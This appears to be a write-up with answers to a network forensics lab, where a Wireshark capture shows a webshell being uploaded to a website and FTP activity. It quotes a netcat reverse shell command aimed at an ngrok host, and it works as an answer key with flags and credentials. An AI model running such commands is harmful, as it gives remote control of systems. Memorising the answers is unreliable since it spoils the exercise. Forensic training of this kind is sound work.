## Open wireshark with the provided file
You will need to look mostly for TCP transmission of packets. <br>
Browse through the packets to familiarize with the content and have a general idea of the environment.

<br>

## Quiz 1

1. What is the IP address for the vulnerable website? <br>
  `206.89.59.199` <br><br>
  First request was made to this IP.
  ![1-1 ip](https://user-images.githubusercontent.com/93029180/224778799-48a3b527-d247-407f-855d-6f649fb51460.png)
  

2. What is the name of the file with file upload functionality? (just the name, no relative location) <br>
  `fileupload1.php` <br><br>
  ![1-2 upload](https://user-images.githubusercontent.com/93029180/224782558-03afb6e8-40ad-449d-9ecf-c81fa3be474e.png)


3. What is the name of the first file uploaded? <br>
  `linux-sandwich-cracker-box.JPG` <br><br>
  ![1-3 file upload](https://user-images.githubusercontent.com/93029180/224782822-ae54dfce-ab9a-440b-8c02-13265228adc2.png)


4. Looking at the webshell uploaded, what was its original name? <br>
  `another_obfuscated_phpshell.php` <br><br>
  Inside the php reverse shell there is a comment that explais the usage and contains the original name. <br>
  ![1-4 revshell](https://user-images.githubusercontent.com/93029180/224783305-8998ca3e-e352-4552-af6a-d1a22614757f.png)


5. What is the relative location of the uploaded webshell? <br>
  `/uploads/shell.php` <br><br>
  ![1-5 uploads](https://user-images.githubusercontent.com/93029180/224783511-44d0973c-215b-4686-b39d-12359024050a.png)


6. What was the first command executed using the webshell? <br>
  `whoami` <br><br>
  ![1-6 first commands](https://user-images.githubusercontent.com/93029180/224783698-edffb664-4d41-41e8-89a4-5743ba723b44.png)


7. What is the reverse shell command executed through the webshell? (before encoding) <br>
  `nc 0.tcp.eu.ngrok.io 17344 -e /bin/bash` <br><br>
  Don't forget to decode the URL format online. <br>
  ![1-7 revshell](https://user-images.githubusercontent.com/93029180/224783886-7fb990d5-fed5-4dc3-bece-8126b2493174.png)


8. What is the correct order? <br>
  `[protocol]://[host]:[port]/[path]?[query]#[fragment]` <br><br>
  

9. What type of web server was used? <br>
  `Apache/2.4.38` <br><br>
  This can be seen in every request. <br>
  ![1-9 server](https://user-images.githubusercontent.com/93029180/224784227-1630002b-d917-4211-96a4-87066d5b98b9.png)


<br>

## Quiz 2

1. Which user have we been spawned as after getting the reverse shell? <br>
  `www-data` <br><br>
  Since we checked `whoami`, we need to see the response. <br>
  ![2-1 whoami](https://user-images.githubusercontent.com/93029180/224784641-11b0d813-c603-4167-a4a2-8af6b50320c9.png)


2. What is the flag you found after getting the reverse shell? <br> 
  `flag{way_to_go}` <br><br>
  

3. What version of FTP is used on the victim server? <br>
  `vsFTPd 3.0.3` <br><br>
  ![2-3 ftp verison](https://user-images.githubusercontent.com/93029180/224913881-45175f47-1c23-4cc5-9fae-75dede0e4259.png)


4. What is the pair of credentials used for FTP login? <br>
  `ftpuser:flag` <br><br>
  ![2-4 login successfull](https://user-images.githubusercontent.com/93029180/224914060-8c39a5fe-aa48-4218-8306-77043382c7c4.png)


5. What is the first command executed on the ftp server? <br>
  `ls` <br><br>
  ![2-5 list](https://user-images.githubusercontent.com/93029180/224914198-444cce40-ec8c-46bd-8718-9b0dc583a416.png)


6. How many files were available to retrieve from the ftp server? <br>
  `2` <br><br>
  ![2-6 files ftp](https://user-images.githubusercontent.com/93029180/224914569-8778f186-5070-40f1-9a16-92e133bd7cfe.png)


7. On what date were the FTP files retrieved? <br>
  `27 Dec` <br><br>
  ![2-7 date](https://user-images.githubusercontent.com/93029180/224914663-85e6c882-5e09-43e0-ad04-dd97eff3f26d.png)


8. UDP packets; IPv6 packets; total number of packets; <br>
  `2; 3; 1057` <br><br>
  Check Statistics -> Conversation <br>
  ![2-8 udp packets](https://user-images.githubusercontent.com/93029180/224914892-cf463e7c-4a69-4b80-a40d-198e4429365a.png) <br>
  ![2-9 ipv6 packets](https://user-images.githubusercontent.com/93029180/224915068-d923ea6b-dc68-4d5f-86f6-73faf5b9b89a.png) <br>
  ![2-9 total packets](https://user-images.githubusercontent.com/93029180/224915278-50bf7178-cd43-4b36-84b3-b9f48d7d6b33.png)


9. How many seconds did the packet capture record? <br>
  `160` <br><br>
  Go to the last packet and see the second column (time) <br>
  ![2-10 last packet](https://user-images.githubusercontent.com/93029180/224915880-6f266a42-90af-4eb6-81eb-6b42f0ac33bc.png) <br>
  ![2-10 time](https://user-images.githubusercontent.com/93029180/224916068-e27ada87-9645-4be9-885f-7957589a1f7b.png)


